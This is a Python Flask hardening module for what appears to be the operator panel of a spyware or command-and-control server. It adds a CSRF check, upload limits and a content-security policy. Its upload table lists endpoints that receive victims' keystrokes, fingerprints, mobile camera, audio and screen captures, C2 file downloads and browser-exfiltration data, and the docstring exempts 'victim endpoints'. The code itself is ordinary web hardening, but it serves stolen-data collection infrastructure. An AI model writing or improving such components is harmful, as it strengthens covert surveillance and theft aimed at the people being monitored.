"""Request hardening (HANDOFF plan sections P7.2 + P7.4).

Two additive gates, registered once via :func:`register_hardening`:

- **CSRF gate (P7.2):** mutating requests made under an *operator*
  session must present a same-origin ``Origin``/``Referer`` header.
  Requests with no such header (curl, scripts, the test harness) are
  allowed — the actual browser-based CSRF vector is covered by the
  combination of the Origin check and the ``SameSite=Lax`` session
  cookie.  Victim endpoints never hold an operator session, so the gate
  never fires for them (victims exempt, as the plan requires).

- **Upload caps (P7.4):** a generous global ``MAX_CONTENT_LENGTH`` plus
  per-endpoint-type limits.  Normal captures (tens of KB to a few MB)
  are far below the limits; only abusive/oversized payloads get a 413.

Frozen-contract note: all new responses (403/413) only trigger on
traffic that was never part of the characterized contract.
"""
from __future__ import annotations

from urllib.parse import urlsplit

from flask import Flask, jsonify, request

# Per-endpoint-type upload ceilings (bytes).  Generous by design.
UPLOAD_TYPE_LIMITS = {
    '/api/fingerprint': 1 * 1024 * 1024,          # fingerprints are small
    '/api/keystrokes': 2 * 1024 * 1024,           # log batches
    '/api/session/': 4 * 1024 * 1024,             # session event batches
    '/api/mobile/screenshot': 30 * 1024 * 1024,   # media captures
    '/api/mobile/camera': 30 * 1024 * 1024,
    '/api/mobile/audio': 30 * 1024 * 1024,
    '/api/mobile/screen_record': 60 * 1024 * 1024,
    '/api/c2/file_download_response': 60 * 1024 * 1024,
    '/api/browser-exfil/receive': 8 * 1024 * 1024,
    '/api/network/receive': 2 * 1024 * 1024,
}

SAFE_METHODS = {'GET', 'HEAD', 'OPTIONS'}

# P9.5: Content-Security-Policy for operator HTML pages.  'unsafe-inline'
# is required by the legacy panel (tailwind play runtime + inline blocks);
# everything external is already vendored (P8), so this kills any
# remaining external-load / framing vector.
CSP_POLICY = (
    "default-src 'self'; "
    "script-src 'self' 'unsafe-inline'; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data: blob:; "
    "font-src 'self'; "
    "connect-src 'self'; "
    "object-src 'none'; "
    "base-uri 'self'; "
    "frame-ancestors 'none'"
)


def csp_header(resp):
    """Attach the CSP to HTML responses only (API shapes untouched)."""
    if resp.mimetype == 'text/html':
        resp.headers.setdefault('Content-Security-Policy', CSP_POLICY)
    return resp


def _header_host(header_value: str) -> str:
    """Extract the host from an Origin/Referer header value."""
    try:
        return (urlsplit(header_value.strip()).hostname or '').lower()
    except Exception:
        return ''


def csrf_gate():
    """403 cross-origin mutating requests that ride an operator session."""
    if request.method in SAFE_METHODS:
        return None
    if not session_ok():
        return None
    origin = request.headers.get('Origin') or ''
    referer = request.headers.get('Referer') or ''
    if not origin and not referer:
        return None  # non-browser client; SameSite=Lax covers browsers
    host = (request.host or '').lower()
    candidate = origin or referer
    if _header_host(candidate) != host:
        return jsonify({'error': 'CSRF validation failed'}), 403
    return None


def session_ok() -> bool:
    from flask import session
    return bool(session.get('IAm-logined'))


def per_type_upload_limit(path: str, content_length, limits=None):
    """Return the exceeded limit (bytes) or ``None`` when within limits."""
    limits = UPLOAD_TYPE_LIMITS if limits is None else limits
    if content_length is None:
        return None
    for prefix, cap in limits.items():
        if path == prefix or path.startswith(prefix):
            if content_length > cap:
                return cap
            return None
    return None


def upload_cap_gate():
    """413 for payloads over their per-type ceiling (global cap is Flask's)."""
    if request.method in SAFE_METHODS:
        return None
    exceeded = per_type_upload_limit(request.path, request.content_length)
    if exceeded is not None:
        return jsonify({'error': 'Payload too large'}), 413
    return None


def register_hardening(app: Flask, max_upload_mb: int = None) -> None:
    """Install cookie hardening + both gates (idempotent per app)."""
    import os
    cap_mb = max_upload_mb or int(os.environ.get('STORM_MAX_UPLOAD_MB', '64'))
    app.config['MAX_CONTENT_LENGTH'] = cap_mb * 1024 * 1024
    app.config['SESSION_COOKIE_HTTPONLY'] = True
    app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
    app.before_request(upload_cap_gate)   # cheap check first
    app.before_request(csrf_gate)
    app.after_request(csp_header)         # P9.5: CSP on HTML responses


__all__ = [
    "UPLOAD_TYPE_LIMITS", "csrf_gate", "upload_cap_gate",
    "per_type_upload_limit", "register_hardening",
]
